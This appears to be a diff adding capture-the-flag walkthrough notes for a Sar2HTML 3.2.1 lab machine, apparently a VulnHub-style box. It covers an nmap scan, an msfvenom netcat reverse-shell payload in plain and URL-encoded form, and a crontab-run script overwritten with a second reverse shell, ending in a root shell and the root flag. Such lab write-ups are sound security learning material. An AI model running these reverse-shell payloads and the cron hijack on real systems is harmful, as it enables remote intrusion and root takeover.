@@ -1,0 +1,51 @@
+Sar2HTML 3.2.1 --> Remote Command Execution --> Web Shell --> user.txt --> root /etc/crontab --> Root shell
+
+
+└─$ sudo nmap -sT -A -Pn -n -p- 192.168.110.30
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-22 16:20 CEST
+Nmap scan report for 192.168.110.30
+Host is up (0.00014s latency).
+Not shown: 65534 closed ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+MAC Address: 08:00:27:14:6F:44 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.14 ms 192.168.110.30
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.88 seconds
+
+└─$ curl http://192.168.110.30/robots.txt  
+sar2HTML
+
+
+└─$ msfvenom -p cmd/unix/reverse_netcat lhost=192.168.110.1 lport=1234 R 
+[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
+[-] No arch selected, selecting arch: cmd from the payload
+No encoder specified, outputting raw payload
+Payload size: 95 bytes
+mkfifo /tmp/gmxot; nc 192.168.110.1 1234 0</tmp/gmxot | /bin/sh >/tmp/gmxot 2>&1; rm /tmp/gmxot
+%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%67%6d%78%6f%74%3b%20%6e%63%20%31%39%32%2e%31%36%38%2e%31%31%30%2e%31%20%31%32%33%34%20%30%3c%2f%74%6d%70%2f%67%6d%78%6f%74%20%7c%20%2f%62%69%6e%2f%73%68%20%3e%2f%74%6d%70%2f%67%6d%78%6f%74%20%32%3e%26%31%3b%20%72%6d%20%2f%74%6d%70%2f%67%6d%78%6f%74
+echo "mkfifo /tmp/rkrity; nc 192.168.110.1 4321 0</tmp/rkrity | /bin/sh >/tmp/rkrity 2>&1; rm /tmp/rkrity" >> /var/www/html/write.sh
+
+
+
+└─$ nc -lvp 4321
+listening on [any] 4321 ...
+192.168.110.30: inverse host lookup failed: Unknown host
+connect to [192.168.110.1] from (UNKNOWN) [192.168.110.30] 46364
+id
+uid=0(root) gid=0(root) groups=0(root)
+cat /root/root.txt
+66f93d6b2ca96c9ad78a8a9ba0008e99
+
